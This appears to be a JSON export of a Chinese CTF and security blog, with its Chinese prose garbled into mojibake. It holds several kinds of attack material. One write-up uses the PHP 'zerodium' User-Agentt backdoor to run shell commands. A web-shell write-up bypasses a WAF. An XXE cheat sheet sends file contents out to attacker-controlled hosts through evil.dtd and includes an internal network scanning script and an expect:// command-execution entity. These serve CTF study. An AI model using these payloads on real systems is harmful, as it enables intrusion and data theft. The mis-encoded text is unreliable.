Popovçš„è´¦å·ï¼Œå‘git.php.netæœåŠ¡å™¨ä¸Šçš„ php-src å­˜å‚¨åº“æ¨é€äº†ä¸¤æ¬¡æ¶æ„æäº¤ã€‚ ç»è§‚å¯Ÿï¼Œåœ¨ä¸¤ä¸ªæ¶æ„æäº¤ä¸­ï¼Œæ”»å‡»è€…åœ¨ä¸Šæ¸¸å‘å¸ƒäº†ä¸€ä¸ªå‡è£…æˆä¿®æ­£æ–‡å­—è¾“å…¥é”™è¯¯çš„ç¥ç§˜ä¿®æ”¹ã€‚ æ”»å‡»è€…ä»¥Rasmus Lerdorfçš„èº«ä»½ç­¾ç½²çš„æ¶æ„æäº¤ï¼ˆéæ³•ï¼‰æ¤å…¥è¿œç¨‹ä»£ç æ‰§è¡Œåé—¨ã€‚ ä»”ç»†æ£€æŸ¥ä¸€ä¸‹æ–°å¢çš„ç¬¬370è¡Œè°ƒç”¨zend_eval_stringå‡½æ•°çš„åœ°æ–¹ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™æ®µä»£ç å®é™…ä¸Šæ˜¯ä¸ºè¿è¡Œè¢«åŠ«æŒçš„PHPç‰ˆæœ¬çš„ç½‘ç«™æ¤å…¥äº†ä¸€ä¸ªåé—¨ï¼Œä»¥è·å¾—è½»æ¾çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚ PHPçš„å¼€å‘è€…è¡¨ç¤ºï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥zerodiumå¼€å¤´ï¼Œè¿™ä¸€è¡Œå°±ä¼šä»User-Agentt HTTPå¤´å†…æ‰§è¡ŒPHPä»£ç ã€‚ æ­¤å¤–ï¼Œæ¶æ„ä»£ç ä¸­åŒ…å«äº†ä¸€æ¡æ³¨è§£ â€œREMOVETHIS: sold to zerodium, mid 2017â€ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒZerodiumæ˜¯ä¸€å®¶çŸ¥åçš„é›¶æ—¥æ¼æ´ç»çºªå•†ï¼Œè€Œæ³¨é‡Šçš„æ„æ€æ˜¯â€œæ¼æ´åœ¨2017å¹´ä¸­å‡ºå”®ç»™äº†zerodiumâ€ã€‚å¯¹æ­¤ï¼ŒZerodiumçš„CEO Chaouki Bekrarè®¤ä¸ºæ”»å‡»è€…å¾ˆå¯èƒ½è¯•å›¾å‡ºå”®è¿™ä¸ªæ¼æ´ï¼Œä½†æ‰¾ä¸åˆ°å–å®¶ï¼Œæ‰€ä»¥æ”»å‡»è€…å¹²è„†è‡ªå·±æ¶æã€‚ åŒæ—¶å‚è€ƒLinkedinä¸Šçš„ä¸€æ–‡ï¼šOfficial PHP Git server attackedï¼Œç…§æ ·æ„é€ payloadï¼Œå¼€å§‹æ²¡æ³¨æ„åˆ°å±æ€§æ˜¯User-Agenttè€Œä¸æ˜¯é»˜è®¤çš„User-Agentï¼Œç™¾è¯•ä¸å‡ºâ€¦ payloadï¼ˆåŠ åœ¨HTTPå¤´ï¼‰ åˆ—ç›®å½•ï¼šUser-Agentt: zerodiumsystem(&#39;ls /&#39;); è¯»æ–‡ä»¶ï¼šUser-Agentt: zerodiumsystem(&#39;cat /flag&#39;); flag flag&#123;cc5dbc99-fd75-41f8-87f6-825c7e08f016&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"çº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›æŠ€èƒ½åœºæ™¯èµ›","slug":"match-çº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›æŠ€èƒ½åœºæ™¯èµ›","date":"2021-04-02T14:23:48.000Z","updated":"2021-04-02T15:07:15.488Z","comments":true,"path":"2021/04/02/match-çº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›æŠ€èƒ½åœºæ™¯èµ›/","permalink":"https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/","excerpt":"","text":"â€‹ ä½äºç¦å»ºçœä¸­è¥¿éƒ¨çš„ä¸‰æ˜å¸‚æ˜¯ä¸€åº§æœ‰ç€ä¼˜è‰¯é©å‘½è¡€è„‰åŠçº¢è‰²ç²¾ç¥çš„åœŸåœ°ï¼Œä½œä¸ºæ›¾ç»çš„ä¸­å¤®è‹åŒºçš„æ ¸å¿ƒåŒºã€ä¸­å¤®çº¢å†›é•¿å¾çš„å‡ºå‘åœ°ã€çº¢æ——ä¸å€’çš„é©å‘½æ ¹æ®åœ°ã€ä¼Ÿäººé©å‘½çš„é‡è¦å®è·µåœ°ï¼Œè¿™ç‰‡çº¢åœŸåœ°åœ¨æ•°å­—åŒ–çš„ä»Šå¤©ï¼Œåœ¨æ‰“å‡»ç½‘ç»œçŠ¯ç½ªï¼Œç»´æŠ¤æ•°å­—ç©ºé—´ç§©åºæ–¹é¢åŒæ ·è¤’æœ‰çº¢è‰²çš„å…ˆè¿›æ€§ã€‚ç»“åˆæ•°å­—ä¸­å›½å³°ä¼šï¼Œå¼€åˆ›ç½‘ç»œå®‰å…¨èµ›äº‹çº¢è‰²å“ç‰Œâ€”â€”â€œçº¢æ˜è°·â€æ¯ï¼Œå°†â€œé£å±•çº¢æ——å¦‚ç”»â€å»¶ä¼¸è‡³ç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œä¸å…¨å›½å„ç•Œç½‘ç»œç²¾è‹±ä¸€åŒæ‰“é€ ç½‘ç»œç©ºé—´çš„çº¢è‰²å®‰å…¨ä¿å«åŸºåœ°ã€‚ æœ¬å±Šå¤§èµ›å°†åˆ›æ–°é€šè¿‡å®‰å…¨æ„è¯†èµ›ã€æŠ€èƒ½åœºæ™¯èµ›ã€æ­æ¦œæŒ‘æˆ˜èµ›ç­‰å¤šç§ç«èµ›æ¨¡å¼ï¼Œç»¼åˆè€ƒå¯Ÿç¤¾ä¼šå…¬ä¼—ã€å…šæ”¿æœºå…³ã€è¡Œä¸šå•ä½ã€ç§‘ç ”é™¢æ ¡ç­‰ç¤¾ä¼šå„ç•Œçš„ç½‘ç»œå®‰å…¨ç†è®ºåŠå®è·µåº”ç”¨æ°´å¹³ï¼Œä¿ƒè¿›ç½‘ç»œå®æˆ˜ï¼Œå»ºç«‹çº¢è‰²é˜²çº¿ï¼Œè§£å†³å®é™…é—®é¢˜ï¼Œç«‹ä½“åŒ–æå‡å‚èµ›å„æ–¹ç½‘ç»œç©ºé—´æ•°å­—æ²»ç†èƒ½åŠ›ã€‚ https://www.ichunqiu.com/hmgctf â€‹ æŠ¥äº†åï¼Œå› å·¥ä½œæ—¥æ²¡æ€ä¹ˆå‚åŠ ï¼Œä¸‹åˆæŠ½ç©ºåšäº†ä¸¤é¢˜ã€‚ Rank: 80+ Miscç­¾åˆ° ä¸€èµ·æ¥å‚ä¸æ•°æ®å®‰å…¨çŸ¥è¯†å°ç«èµ›ã€‚ ç­”é¢˜æ‹¿flagã€‚ â€‹ æ­ªæ¯”æ­ªæ¯” æˆ´å¤«å‘é€äº†ä¸€äº›ä¿¡æ¯ç»™åƒµå°¸ï¼Œä½†æ˜¯è¢«æˆ‘æˆªè·åˆ°äº†ã€‚çœ‹çœ‹èƒ½ä»é‡Œè¾¹å‘ç°ä»€ä¹ˆ?å¥½åƒæ˜¯ä¸€ä¸ªSurpriseï¼Œä½ æ¥ç¿»è¯‘ç¿»è¯‘? æµé‡åŒ…é‡Œå¥—ç€å“ˆå¤«æ›¼ç¼–ç é¢˜ï¼Œæ ¹æ®è¯é¢‘è§£ç 01ä¸²ã€‚ æ­£è¦è§£å‡ºï¼Œåˆ°æ—¶é—´äº†ã€‚ â€‹ CryptoezCRT Chinese Remainder Theorem is fantastic 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import gmpy2from random import shuffleflag = b&quot;flag is here&quot;def shuffle_flag(s): str_list = list(s) shuffle(str_list) return &#x27;&#x27;.join(str_list)nl = []el = []count = 0while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1print(nl)print(el)cl = []flag = shuffle_flag(flag.decode()).encode()for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i]))print(cl) äº”ç»„ $n,e$ï¼Œå…±ç§é’¥ $d$ï¼Œç”¨LLLç®—æ³•æ‰“ã€‚å‘ç° $n$ éƒ½å·²å¸®ä»å°åˆ°å¤§æ’å¥½åºï¼Œä¸€æ­¥åˆ°ä½ã€‚ ç”±äº d = gmpy2.next_prime(bytes_to_long(flag))ï¼Œæ±‚å‡º $d$ åå¾€å›éå†æ‹¿åˆ°flagã€‚ 123456789101112131415161718192021#Sagefrom gmpy2 import *n = e = c = M=iroot(int(n[4]),int(2))[0]a = [0]*6a[0] = [M,e[0],e[1],e[2],e[3],e[4]]a[1] = [0,-n[0],0,0,0,0]a[2] = [0,0,-n[1],0,0,0]a[3] = [0,0,0,-n[2],0,0]a[4] = [0,0,0,0,-n[3],0]a[5] = [0,0,0,0,0,-n[4]]Mat = matrix(ZZ,a)Mat_LLL = Mat.LLL()d = abs(Mat_LLL[0][0]) // Mfor k in range(1500): print(bytes.fromhex(hex(d-k)[2:])) â€‹ Webwrite_shell ä¸‡æ— ä¸€å¤±çš„wafã€‚ 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; ç®€å•RCEã€‚ å…ˆç”¨ ?action=pwd å¾—åˆ°æ‰€åœ¨ç›®å½•ï¼Œå†ç”¨ ?action=upload&amp;data=xxx å†™PHPä»£ç ã€‚ waf()å‡½æ•°è¿‡æ»¤äº†php å’Œ ç©ºæ ¼ï¼Œç”¨çŸ­æ ‡ç­¾å’Œ %09 å³å¯ç»•è¿‡ã€‚ ?action=upload&amp;data=&lt;?=`ls%09/`?&gt; è¯»æ ¹ç›®å½•ï¼Œå‘ç°æ–‡ä»¶ !whatyouwantggggggg401.phpï¼Œ ?action=upload&amp;data=&lt;?=`tac%09/!whatyou*`?&gt; è¯»æ–‡ä»¶ï¼Œè®¿é—®sandboxç›®å½•æŸ¥çœ‹æºç å¾—åˆ°flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XXE","slug":"web-XXE","date":"2021-03-01T10:27:23.000Z","updated":"2022-09-01T16:08:17.797Z","comments":true,"path":"2021/03/01/web-XXE/","permalink":"https://lazzzaro.github.io/2021/03/01/web-XXE/","excerpt":"","text":"â€‹ XMLæ˜¯ä¸€ç§éå¸¸æµè¡Œçš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºé…ç½®æ–‡ä»¶ã€‚åœ¨è§£æå¤–éƒ¨å®ä½“çš„è¿‡ç¨‹ä¸­ï¼ŒXMLè§£æå™¨å¯ä»¥æ ¹æ®URLä¸­æŒ‡å®šçš„æ–¹æ¡ˆï¼ˆåè®®ï¼‰æ¥æŸ¥è¯¢å„ç§ç½‘ç»œåè®®å’ŒæœåŠ¡ã€‚ å¤–éƒ¨å®ä½“å¯¹äºåœ¨æ–‡æ¡£ä¸­åˆ›å»ºåŠ¨æ€å¼•ç”¨éå¸¸æœ‰ç”¨ï¼Œè¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ã€‚ XXEï¼ˆXML External Entityï¼Œå¤–éƒ¨å®ä½“ï¼‰ï¼Œä»å®‰å…¨è§’åº¦ç†è§£æˆ XML External Entity attack å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ã€‚ç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„ã€‚ â€‹ åŸºæœ¬æ ¼å¼ï¼ˆå¤–éƒ¨å®ä½“ï¼‰1234567891011121314&lt;!-- é€šç”¨å®ä½“ --&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;&lt;!-- å‚æ•°å®ä½“ --&gt;&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd; â€‹ æ³¨å…¥æœ‰å›æ˜¾ å¸¸è§„ 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; æ–‡ä»¶å«ç‰¹æ®Šå­—ç¬¦ï¼ˆå‚æ•°å®ä½“ï¼‰ 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; â€‹ æ— å›æ˜¾ (Blind OOB XXE) å¸¸è§„ 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt; æ”¯æŒçš„åè®®ï¼š PHP: file http ftp php compress.zlib compress.bzip2 data glob phar Java: http https ftp file jar netdoc mailto gopher â€‹ å…¶ä»–åˆ©ç”¨ HTTPå†…ç½‘ä¸»æœºæ¢æµ‹ åˆ©ç”¨ file åè®®è¯»å–ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ï¼Œå¯ä»¥å°è¯•è¯»å– /etc/network/interfaces æˆ–è€… /proc/net/arp æˆ–è€… /etc/host æ–‡ä»¶ï¼Œå°±æœ‰å¤§è‡´çš„æ¢æµ‹æ–¹å‘ã€‚ 123456789101112131415161718192021222324252627282930313233import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125; x = requests.post(&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&#x27; &#x27;)[-2] # a little split to get only the base64 encoded value print(coded_string)# print(base64.b64decode(coded_string))for i in range(1, 255): try: i = str(i) ip = &#x27;10.0.0.&#x27; + i string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27; print(string) build_xml(string) except:continue HTTPå†…ç½‘ä¸»æœºç«¯å£æ‰«æ æ‰¾åˆ°å†…ç½‘ä¸€å°ä¸»æœºï¼Œæƒ³è¦çŸ¥é“æ”»å‡»ç‚¹åœ¨å“ªï¼Œè¿˜éœ€è¦è¿›è¡Œç«¯å£æ‰«æï¼Œç«¯å£æ‰«æçš„è„šæœ¬ä¸ä¸»æœºæ¢æµ‹ç±»ä¼¼ï¼Œåªè¦æŠŠIPåœ°å€å›ºå®šï¼Œç„¶åå¾ªç¯éå†ç«¯å£ï¼Œå½“ç„¶ä¸€èˆ¬ç«¯å£æ˜¯é€šè¿‡å“åº”çš„æ—¶é—´çš„é•¿çŸ­åˆ¤æ–­è¯¥è¯¥ç«¯å£æ˜¯å¦å¼€æ”¾çš„ã€‚é™¤äº†è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜èƒ½ç»“åˆ burpsuite è¿›è¡Œç«¯å£æ¢æµ‹ã€‚ RCE ä¸»è¦æ˜¯ç”±äºé…ç½®ä¸å½“/å¼€å‘å†…éƒ¨åº”ç”¨å¯¼è‡´çš„ã€‚å¦‚æœè¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”PHP expectæ¨¡å—è¢«åŠ è½½åˆ°äº†æ˜“å—æ”»å‡»çš„ç³»ç»Ÿæˆ–å¤„ç†XMLçš„å†…éƒ¨åº”ç”¨ç¨‹åºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤ã€‚ 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;/core&gt;&lt;/catalog&gt; â€‹ ç»•è¿‡ï¼ˆbypassï¼‰ åè®®ï¼ˆå¦‚httpï¼‰ å¯ä»¥åˆ©ç”¨å®ä½“ç¼–ç ç»•è¿‡ã€‚ åŒé‡å®ä½“ç¼–ç  1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt; %xml;]&gt;&lt;!--ç¼–ç å†…å®¹--&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;&lt;core&gt; &lt;message&gt;&amp;xxe;&lt;/message&gt;&lt;/core&gt; data://åè®® 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;data://text/plain;base64,YWRtaW4=&quot; &gt;]&gt;&lt;comment&gt;&lt;sender&gt;&amp;xxe;&lt;/sender&gt;&lt;content&gt;111&lt;/content&gt;&lt;/comment&gt; 12345678910&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;&gt; %a; %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;&lt;!--ç¼–ç å†…å®¹--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; file://åè®®+æ–‡ä»¶ä¸Šä¼  12345678&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt;&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; php://filteråè®®+æ–‡ä»¶ä¸Šä¼  1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt; 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== å…³é”®è¯ï¼ˆå¦‚ ENTITY, SYSTEM, fileï¼‰ ä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 12345678910import requestsurl = &#x27;http://url/&#x27;payload = &quot;&quot;&quot;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://yourVPS/evil.dtd&quot;&gt;%remote;%int;%send;]&gt;&quot;&quot;&quot;payload = payload.encode(&#x27;utf-16&#x27;)requests.post(url, data=payload) evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://42.192.137.212/index.php?q=%file;&#x27;&gt;&quot;&gt; â€‹ å‚è€ƒä»å‡ é“CTFé¢˜å­¦ä¹ Blind XXE","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"}],"author":"Lazzaro"},{"title":"é™æ€åè°ƒè¯•","slug":"reverse-é™æ€åè°ƒè¯•","date":"2021-02-24T14:23:51.000Z","updated":"2023-11-25T16:02:34.598Z","comments":true,"path":"2021/02/24/reverse-é™æ€åè°ƒè¯•/","permalink":"https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"â€‹ é™æ€åè°ƒè¯•æŠ€æœ¯åªéœ€è¦åœ¨ç¨‹åºè¿è¡Œä¹‹å‰è¿›è¡Œä¸€æ¬¡ç ´è§£å³å¯è§£é™¤å…¨éƒ¨é™åˆ¶ï¼Œä¸”ä¸éœ€è¦äºŒæ¬¡æ“ä½œã€‚è€Œä¸”é™æ€åè°ƒè¯•æŠ€æœ¯å¯¹äºæ“ä½œç³»ç»Ÿçš„ä¾èµ–æ€§éå¸¸å¤§ï¼Œç›¸åŒçš„åè°ƒè¯•æŠ€æœ¯åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿè¡¨ç°å¯èƒ½ä¸åŒã€‚ å‚è€ƒï¼š https://xz.aliyun.com/t/5685 https://xz.aliyun.com/t/5732/ https://xz.aliyun.com/t/6133 ptraceptraceå³process tracerï¼ˆè¿›ç¨‹è·Ÿè¸ªï¼‰ï¼Œptraceç³»ç»Ÿè°ƒç”¨æ˜¯ Linux æä¾›çš„ä¸€ä¸ªè°ƒè¯•è¿›ç¨‹çš„å·¥å…·ï¼Œå…¶æä¾›äº†ä¸€ç§å¯ä»¥è§‚å¯Ÿå’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹ï¼ˆtraceeï¼‰çš„æ–¹æ³•ï¼Œå¹¶æ£€æŸ¥å’Œæ›´æ”¹traceeçš„å­˜å‚¨å™¨å’Œè·Ÿè¸ªå™¨ï¼Œä¸»è¦ç”¨äºå®æ–½æ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªï¼Œlinuxä¸‹å¸¸è§çš„è°ƒè¯•å·¥å…·GDBåŸç†å°±æ˜¯åŸºäºptraceã€‚ ptraceæ£€æµ‹æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ã€‚ â€‹ åŠ å£³UPXæ‰‹åŠ¨è„±å£³ x32dbgæ‰“å¼€ï¼Œç‚¹å‡»è¿è¡Œï¼ˆF9åˆ°è¾“å…¥ç‚¹ï¼‰ï¼Œè·³è¿‡ntdllçš„åŠ è½½ï¼Œç­‰åˆ°ç¨‹åºè¾“å‡ºç‰¹å¾å­—ç¬¦ä¸²åï¼Œå®šä½å­—ç¬¦ä¸² è¿½è¸ªè¿‡å»åå¾€ä¸Šç¿»ï¼Œæ‰¾åˆ°è¿è¡Œå…¥å£ ç„¶åç”¨æ’ä»¶Scyllaæ¥dumpå‡ºè¿™æ®µï¼Œdumpåˆ°ä¸€ä¸ªç¨‹åºï¼Œç„¶åidaå°±å¯ä»¥æ­£å¸¸åˆ†æäº† â€‹ èŠ±æŒ‡ä»¤å»èŠ± IDA - ç”¨ U å–æ¶ˆå¯¹åº”ä»£ç æ®µçš„å®šä¹‰,ç„¶ååœ¨è·³è½¬ä½ç½®å‡ºç”¨çƒ­é”® C é‡æ–°å®šä¹‰å³å¯ï¼Œä¸­é—´çš„åƒåœ¾ä»£ç nopæ‰ã€‚ 1234567891011121314151617181920import idautilsdef nop(addr,endaddr): while(addr&lt;endaddr): PatchByte(addr,0x90) addr+=1def undefine(addr,endaddr): while addr&lt;endaddr: MakeUnkn(addr,0) addr+=1def dejunkcode(addr,endaddr): while addr&lt;endaddr: MakeCode(addr) # åŒ¹é…æ¨¡ç‰ˆ if Byte(addr)==0xe8 and Byte(addr+6)==0x12 and Byte(addr+7)==0x83: next=addr+10 nop(addr,next) addr=next continue 